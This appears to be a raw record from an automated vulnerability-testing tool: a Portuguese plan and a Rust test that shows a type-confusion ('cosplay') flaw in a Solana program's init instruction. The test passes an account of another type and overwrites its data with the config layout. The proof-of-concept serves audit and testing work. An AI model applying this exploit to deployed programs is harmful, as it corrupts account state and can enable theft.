attempts.raw:
{
  "plan": "O programa `init` (Pinocchio) escreve um discriminador fixo [1..8] e campos de config em `accounts[0]` sem validar o tipo da conta. O baseline usa uma conta vazia (recém-criada) como `accounts[0]` e uma authority, provando que o uso legítimo grava o layout esperado. O ataque fornece uma conta de outro tipo (com dados pré-existentes e discriminador diferente) como `accounts[0]`, mantendo a mesma authority. O efeito medido é que os dados da conta de outro tipo foram sobrescritos com o layout de config (discriminador [1..8] e authority), demonstrando o COSPLAY.",
  "scenario": "let authority = Pubkey::new_unique();
let authority_account = wallet(1_000_000_000);

// Baseline: conta vazia (será inicializada) como accounts[0]
let config_empty = empty_account();
let baseline_ix = env.raw_ix(&[0u8], &[
    AccountMeta::new(config_empty.key(), true),
    AccountMeta::new_readonly(authority, false),
]);
let baseline_accounts = vec![
    (config_empty.key(), config_empty),
    (authority, authority_account.clone()),
];
let baseline_result = env.baseline("init legitimo", &baseline_ix, &baseline_accounts);

// Ataque: conta de outro tipo (discriminador diferente) como accounts[0]
let other_type_data = anchor_account_data("OtherType", &(Pubkey::new_unique(), 42u64, true));
let other_type_account = account(&env.program_id, &other_type_data, None);
let attack_ix = env.raw_ix(&[0u8], &[
    AccountMeta::new(other_type_account.key(), true),
    AccountMeta::new_readonly(authority, false),
]);
let attack_accounts = vec![
    (other_type_account.key(), other_type_account),
    (authority, authority_account),
];
let attack_result = env.attack("cosplay: conta de outro tipo como config", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let data = after(&attack_result, &other_type_account.key()).data();
    env.effect(
        "dados da conta de outro tipo sobrescritos com layout de config",
        data.len() >= 49
            && data[0..8] == [1, 2, 3, 4, 5, 6, 7, 8]
            && read_pubkey(data, 8) == authority
            && data[40] == 1
            && read_u64(data, 41) == 0,
    );
}"
}

